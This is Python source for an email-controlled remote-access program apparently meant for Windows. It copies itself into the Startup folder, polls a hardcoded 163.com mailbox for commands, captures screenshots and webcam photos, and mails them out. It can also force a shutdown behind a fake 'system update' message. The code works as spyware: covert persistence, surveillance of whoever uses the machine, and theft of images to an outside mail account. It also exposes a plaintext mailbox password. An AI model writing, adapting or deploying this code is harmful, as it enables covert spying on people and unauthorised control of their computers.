import os
import sys
import time
import tempfile
from socket import gaierror
from utils import winfunc , emailhelper, imgcap
from PyQt5.QtCore import pyqtSignal, QObject, QBasicTimer
from PyQt5.QtWidgets import QApplication, qApp
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

DEBUG = False

def debug_log(msg):
	if DEBUG:
		print(msg)

#这个类负责控制EmailPC的数据
class EmailPCData(QObject):

	def __init__(self,parent=None):
		QObject.__init__(self,parent)
		#配置邮箱信息
		self._SMTPServer = "smtp.163.com"
		self._STMPPort = 25
		self._POPServer = "pop.163.com"
		self._POPPort = 110
		self._User = "17826800084@163.com"
		self._Pwd = "shagua.116wy"

		#配置命令列表， 用于显示帮助信息
		#-- (命令名字，命令参数，命令介绍)
		self._SupportedCommand = [
		('screen_grab','None','可以抓取当前屏幕显示的内容'),
		('camera_grab','None','可以调用对方摄像头进行拍照'),
		('shutdown_computor','delay（s）','可以在 delay 秒后关闭对方的计算机')
		]

		#配置命令邮件的标题
		self._ValidTitle = "EmailCommand"

		#配置读取邮件的间隔， 单位秒
		self._Interval = 10

		#获得图像对象
		self._ImgCap = imgcap.ImgCapture(self)
		#创建临时目录
		self._TmpDir = tempfile.TemporaryDirectory()
		#-- 屏幕截图的文件名
		self._ScreenCapImgName = "sc.jpg"
		#-- 照片的文件名
		self._CameraCapImgName = "cc.jpg"

#这个类代表一封命令邮件中要执行的所有的命令， 叫做 任务
class Task(EmailPCData):
	#Task 完成所有使命之后， 发送自身 id
	#使用Qt发送 id 可能会被截断， Qt 里面 int 长度不够长。 而 Pyhon 的id 很长
	#所以我决定使用字符串， 这样不会与长度限制了
	TaskComplete = pyqtSignal(str)

	def __init__(self,parent=None):
		EmailPCData.__init__(self,parent)

		debug_log("创建了 Task 一个, id 是 {}".format(id(self)))

		#不知道为何在任务完成时， 发送出去的 id 发生了变化 ， 无奈之下
		#我创建这个变量保存自己的ID

		self._MyID = id(self)

		#一个待完成的命令
		self._OutgoingMsg = emailhelper.EmailMessage()
		self._OutgoingMsg.setFinished(False)

		#计数器， 对未完成的命令进行计数
		self._RestedCommand = -1

		#开启定时器， 定时检查计数器， 如果为0， 则发送完成信息
		self._Timer = QBasicTimer()
		self._Timer.start(500,self)



	def timerEvent(self,e):
		
		if self._RestedCommand == 0 :

			self._OutgoingMsg.setFinished(True)
			self._OutgoingMsg.setTitle("命令已经成功执行了哦")
			self._OutgoingMsg.sendAndReset(self._SMTPServer,self._STMPPort,
				self._User,self._Pwd,self._User)

			#关闭计时器
			self._Timer.stop()

			#发送任务已经完成的信息
			self.TaskComplete.emit(str(self._MyID))

	#cmds: list， （cmd_name,param） 的列表
	#注意， cmds 来自 EmailPC 主逻辑， 它不会保证命令是被支持的
	def startTask(self,cmds):

		self._RestedCommand = len(cmds)
		
		#开始逐个执行命令（执行不代表完成命令）
		for cmd_name, param in cmds:

			if cmd_name == "screen_grab":
				self.screenGrab()
			elif cmd_name == "camera_grab":
				self.cameraGrab()
			elif cmd_name == "shutdown_computor":
				self.shutdownComputor(param)
			#不支持的命令
			else:
				self._RestedCommand -= 1

	#---------------------------------------------

	def screenGrab(self):
		#获得保存的临时文件路径
		filename = os.path.join(self._TmpDir.name,self._ScreenCapImgName)
		#截屏
		self._ImgCap.screenCapture(filename)
		with open(filename,'rb') as fp:
			self._OutgoingMsg.addImg(fp.read())

		#减少计数
		self._RestedCommand -= 1

	def cameraGrab(self):
		#获得保存的临时文件路径
		filename = os.path.join(self._TmpDir.name,self._CameraCapImgName)
		#开始拍照
		self._ImgCap.cameraCapture(filename)
		self._ImgCap.cameraCapOk.connect(self.cameraGrabComplete)

	def cameraGrabComplete(self,filename):
		#添加到待发邮件中
		with open(filename,'rb') as fp:
			self._OutgoingMsg.addImg(fp.read())

		#减少计数
		self._RestedCommand -= 1


	def shutdownComputor(self,delay):
		#执行命令
		winfunc.cmd("shutdown -f -s -t {} -c 系统更新成功".format(delay))
		#减少计数
		self._RestedCommand -= 1

class EmailPC(EmailPCData):
	"""

	--不足

		我觉得这个类设计的最大问题就是
		没有将 主要逻辑 ， 数据， 辅助功能分离开来

	"""

	def __init__(self,parent=None):
		#配置一些常量属性
		EmailPCData.__init__(self,parent)

		#做一些初始化配置，并设置为开机自启动
		self.initConfig()

		#向指定邮箱报告自身启动成功了
		self.sayHello()

		self.startMainLoop()

	def initConfig(self):

		#对正在执行的 Task 对象保持引用， 直到任务完成
		self._Tasks = {}

		#获得开机自启动目录
		self._StartUpFolder = winfunc.getStartUpFolderPath()
		debug_log("自启动目录: {}".format(self._StartUpFolder))

		#获取程序当前目录（地址中不包含自身的名字）
		self._CurDir = os.getcwd()
		debug_log("程序当前目录: {}".format(self._CurDir))

		#获得自己的名字
		self._MyName = os.path.basename(sys.argv[0])
		debug_log("我的名字是： {}".format(self._MyName))

		#如果不是开机自启动， 设置为自启动
		if self._CurDir != self._StartUpFolder:
			winfunc.copyFile(sys.argv[0],self._StartUpFolder)
			debug_log("设置为开机自启动成功.")

	def sayHello(self):
		msg = """\
		Hello 已经可以使用了哦。 

		怎么发送一个命令：


		邮件标题： EmailCommand
		邮件内容:
		命令名字_1 参数(没有写None)
		命令名字_2 参数(没有写None)

		PS： 命令会被依此执行

		支持的命令如下:

		{}
		"""

		command = ""
		for com in self._SupportedCommand:
			for e in com:
				command += (e+ "\t")
			command += "\n"

		try:
			emailhelper.send(self._SMTPServer,self._STMPPort,self._User,self._Pwd,
			self._User,"可以使用了哦",msg.format(command))
		except Exception as e:
			debug_log("Say Hello ： 发送报告邮件失败， 请检查网络" )


	#主循环， 每隔一个 self._Interval 秒， 调用一次
	def timerEvent(self,e):

		try:
			#获取最新的邮件
			title , msg = emailhelper.recv(self._POPServer,self._POPPort,self._User,self._Pwd)
		except gaierror as e:
			debug_log("Main Loop： 接受邮件失败， 请检查网络")
			return
		

		#判断是否是命令邮件
		if not self.isCommand(title): return

		#开始解析命令
		cmds = self.analyseCommand(msg)

		#创建一个任务去执行命令
		# executeCommand(cmds)
		t = Task()
		t.TaskComplete.connect(self.taskComplete)
		self._Tasks[str(id(t))] = t
		debug_log("MainLoop - task id: {}".format(id(t)) )
		t.startTask(cmds)


	def startMainLoop(self):

		self._Timer = QBasicTimer()
		self._Timer.start(self._Interval * 1000 , self)

	#-------------------------------------------------------

	#当 Task 完成任务之后， 发送信号到这个槽， 然后删除对该 Task 的引用
	def taskComplete(self,obj_id):
		debug_log("taskComplete task id: {}".format(obj_id))
		del self._Tasks[obj_id]

	def isCommand(self,title):
		return title == self._ValidTitle

	def analyseCommand(self,msg):
		"""
		成功解析的命令， 会返回一个列表
		[('command_name','param'),..]


		邮件消息里可能会有广告信息
		"""
		#清理开头结尾的空白字符
		#按行分割，获取每条命令的详细信息
		lines = msg.strip(" \n\r\t").split("\n")

		rtn = []
		for e in lines:
			#清理下两侧的空白字符， 然后按空格分隔
			r = e.strip(" \n\r\t")
			r = r.split(' ')
			debug_log("analyseCommand: {}".format(r))

			#这样做的目的是防止出现的空的或者少的命令行
			#使得程序更加的健壮
			if len(r) >= 2:
				command_name = r[0]
				param = r[1]
				rtn.append((command_name,param))

		return rtn
		
	#这个函数被废弃了
	def executeCommand(self,cmds):
		"""
		--废弃

			我意识到了， 一条命令有可能不太可能在一次 executeCommand 中完成，
			因为拍照功能的完成时间的不确定性， 使得一个邮件中所有命令的完成不可能在本函数的一次调用中完成。
			所以需要另外的一个函数作为槽， 来发送一封完成的邮件

			因为拍照功能的特殊性， 使得一条指令的完成的时间变成不确定， 所以需要使用信号和槽的机制。
			在这里我要引入一个标志位 - _UnfinishedCamera ， 这标志位是一个整数， 用来标识， 还未完成的
			照相操作。 当 _UnfinishedCamera 为 0 的时候， 表示所有的照相机操作完成了。

			为了防止， 当 _UnfinishedCamera 为 0， 即所有的照相任务完成， 但是其他的一些命令没有完成的情况，
			再引入一个标识 _HaveExecutedAll ， 这个命令是布尔类型， 当命令邮件中的所有命令都被执行一遍之后（执行， 不代表完成， 如照相机）
			这个变量会被设置为 True

		--正确的姿势

			我意识到了我使用 Qt 的方式出现了问题， 这并不是正确的姿势， 因为一封命令邮件从执行到完成， 
			并不是瀑布式的（也就是一条接一条执行，到最后完成）。

			它因为是响应型的， 也是说当收到一封命令邮件的时候， 应该将其委托给另外一个对象（这个对象身上连接着各种信号， 当所有的条件具备的时候）
			它会执行相应的操作。 而主逻辑（接受邮件，分析，委托执行）则只执行他自己的任务， 而应该对非瀑布式的部分视而不见。

		"""
		pass



if __name__ == '__main__':
	try:

		#
		if not DEBUG:
			time.sleep(20)

		app = QApplication(sys.argv)

		#一旦创建就可以开始工作了
		e = EmailPC()

		r = app.exec_()

	except Exception as e:

		msg = str(e)

		# emailhelper.send(e._SMTPServer,e._SMTPPort,e._User,e._Pwd,
		# 	e._User,"不好， 程序意外关闭掉了" , msg)

	else:

		emailhelper.send(e._SMTPServer,e._SMTPPort,e._User,e._Pwd,
			e._User,"没有出现问题， 程序正常退出了" , "没有出现任何问题哟")